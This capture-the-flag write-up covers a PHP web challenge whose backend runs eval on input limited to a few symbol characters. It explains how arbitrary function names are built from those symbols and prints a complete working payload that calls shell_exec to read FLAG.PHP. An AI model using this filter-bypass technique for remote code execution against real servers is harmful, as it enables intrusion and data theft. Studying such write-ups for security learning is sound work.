# Jailoo Warmup (Web)

We have a webpage containing a form with a text input box and a submit button. We are also given this fragment of backend code:
```php
<?php 
	if(sizeof($_REQUEST)===2&& sizeof($_POST)===2){
	$cmd=$_POST['cmd'];
	$submit=$_POST['submit'];
	if(isset($cmd)&& isset($submit)){
		if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
			echo "<div class=\"success\">Command executed !</div>";
			eval($cmd);
		}else{
			die("<div class=\"error\">NOT ALLOWED !</div>");
		}
	}else{
		die("<div class=\"error\">NOT ALLOWED !</div>");
	}
	}else if ($_SERVER['REQUEST_METHOD']!="GET"){
		die("<div class=\"error\">NOT ALLOWED !</div>");
	}
	 ?>
```
Finally, we are told that the flag is in `FLAG.PHP`.

It seems like the text we input will be directly executed as PHP code, but with restrictions: we can only use the characters `$()_[]=;+".`. Otherwise the server will return an error message.

Let's look at what we have. `$` allows us to define and reference variables. `_` is the only character we have that is valid in a variable name, so all our variables must be named `$_`, `$__`, `$___`, etc. `()` can be used for grouping. `[]` lets us write array literals and perform indexing. `=` can be used for assignment or the `==` operator. `;` is used to terminate statements. `+` can be used for the `+` and `++` operators. `"` is for string literals, and `.` is the string concatenation operator.

First of all, we can express `1` as `[]==[]`. If we have two numbers, we can also represent their sum using the `+` operator.

To get strings, we can use the `.` operator with arrays which converts them to strings. `[].[]` evaluates to `"ArrayArray"`. To get individual characters, we can use `[]` to index into the string, with the index constructed using numbers as described above.

Adding a number to a character does not do anything. However, if we have a variable containing a letter, and we apply the `++` operator on the variable, it becomes the next letter. For instance, if we have `$_` has value `'a'` and we run `$_++;` then `$_` will have value `'b'` afterwards. Note that this only works for (both lowercase and uppercase) letters. It does not work for any non-letter characters. Using this method, we can encode all letter strings, by starting with one of the letters in `"ArrayArray"` and continuously incrementing it.

PHP has an interesting feature where you can call strings as functions. The expression `("func")(x)` is the same as `func(x)`, i.e., when a string is called as a function, PHP finds the function in the current environment whose name is the string and calls that function with the given arguments. This allows us to programmatically construct the names of functions that we want to call, so that we don't have to refer to functions using their literal name (which would have letters and therefore would not be allowed). We can already encode any letter using the allowed characters (as well as `"_"` which is trivial), and we can concatenate letters together using `.`, so we can encode any single-argument function call, assuming that the argument is also encodable, and that the function name is composed of only letters and `_`. We cannot encode multi-argument function calls because `,` is not allowed.

However, at this point we still can only have letters and the allowed characters in strings. To be able to represent *any* character in a string, we can use the `chr` function. `chr` converts a character code into its corresponding character; for example, `chr(97)` is `"a"`. Since we can already represent any number, all we need to do is construct the character code and then call `chr` using the trick described above, where we encode `"chr"` and then call it on the number.

Now we need to think about what we want the exploit code to do. We need it to have output so that we can see the result on the returned HTML page. The standard way to do that in PHP is with `echo`. However, `echo` is a statement, not a function, so we cannot invoke it using the string calling trick. Luckily, PHP has actual functions which perform output as well; I came across the `print_r` function, which "prints human-readable information about a variable". For our purposes, it does the same thing as `echo`.

Once we have all this set up, we can try reading `FLAG.PHP`. I tried using the `file_get_contents`, but it didn't work. In fact, any PHP function involving file I/O, such as `file_exists` or `scandir`, didn't work. It seems like they disabled these functions to make the challenge harder. But found a function that *did* work: `shell_exec`. It takes a shell command, runs it, and returns the result as a string. Using this, we can read the file simply by calling `shell_exec("cat FLAG.PHP")`. (And we can do a lot of other things as well!) Therefore, the solution is to encode `print_r(shell_exec("cat FLAG.PHP"));`.

To perform the actual encoding, I wrote a Python script. At first, I used the most straighforward method of first obtaining the string `"chr"` using the incrementing method on a counter variable, then representing every character as `("chr")(1+1+1+...+1)` where each `1` is `([]==[])`. This resulted in very long generated code. When I tried submitting it, it would fail with an error, even though the code only contained the allowed characters. Upon further experimentation, it turned out that the `preg_match_all` function silently fails if the input is over 2047 characters long. So I needed to make the script more sophisticated to optimize the size of the generated code. In the end, I decided to create variables holding the powers of 2. Each variable is the sum of two of the previous one, and the first one is `[]==[]`. Then any character code can be represented efficiently as the sum of certain powers of 2. This allowed the code size to be well within the limit, and I obtained the flag. It turned out that `FLAG.PHP` had the flag inside a HTML comment, so I couldn't see it on the page at first and had to open developer tools to see it.

The output of the script is:
```
$__=[]==[];$_=([].[])[$__+$__+$__];$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$____=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$____.$_;$___=$__+$__;$____=$___+$___;$_____=$____+$____;$______=$_____+$_____;$_______=$______+$______;$________=$_______+$_______;($_($______+$_______+$________).$_($___+$______+$_______+$________).$_($__+$_____+$_______+$________).$_($___+$____+$_____+$_______+$________).$_($____+$______+$_______+$________)."_".$_($___+$______+$_______+$________))(($_($__+$___+$______+$_______+$________).$_($_____+$_______+$________).$_($__+$____+$_______+$________).$_($____+$_____+$_______+$________).$_($____+$_____+$_______+$________)."_".$_($__+$____+$_______+$________).$_($_____+$______+$_______+$________).$_($__+$____+$_______+$________).$_($__+$___+$_______+$________))($_($__+$___+$_______+$________).$_($__+$_______+$________).$_($____+$______+$_______+$________).$_($_______).$_($___+$____+$________).$_($____+$_____+$________).$_($__+$________).$_($__+$___+$____+$________).".".$_($______+$________).$_($_____+$________).$_($______+$________)));
```
